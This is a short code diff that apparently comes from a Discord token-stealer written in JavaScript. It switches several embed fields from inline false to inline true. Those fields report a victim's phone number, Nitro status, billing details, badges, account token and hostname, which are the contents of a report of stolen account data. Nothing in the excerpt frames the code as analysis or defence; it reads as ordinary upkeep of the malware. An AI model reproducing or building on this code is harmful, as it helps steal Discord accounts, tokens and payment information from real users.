@@ -361,12 +361,12 @@ var event_handlers = {
                     {
                         name: "Phone Number",
                         value: `\`\`\`${userInfo.phone ?? "None"}\`\`\``,
-                        inline: false
+                        inline: true
                     },
                     {
                         name: "Nitro",
                         value: `${getNitro(userInfo.premium_type)}`,
-                        inline: false
+                        inline: true
                     }, {
                         name: "Billing",
                         value: `${billing}`,
@@ -374,16 +374,16 @@ var event_handlers = {
                     }, {
                         name: "Badges",
                         value: `${getBadges(userInfo.flags)}`,
-                        inline: false
+                        inline: true
                     },
                     {
                         name: "Token",
                         value: `\`\`\`${token}\`\`\``,
-                        inline: false
+                        inline: true
                     }, {
                         name: "Hostname",
                         value: `\`\`\`${os.hostname}\`\`\``,
-                        inline: false
+                        inline: true
                     },
                 ],
             }), createEmbed({
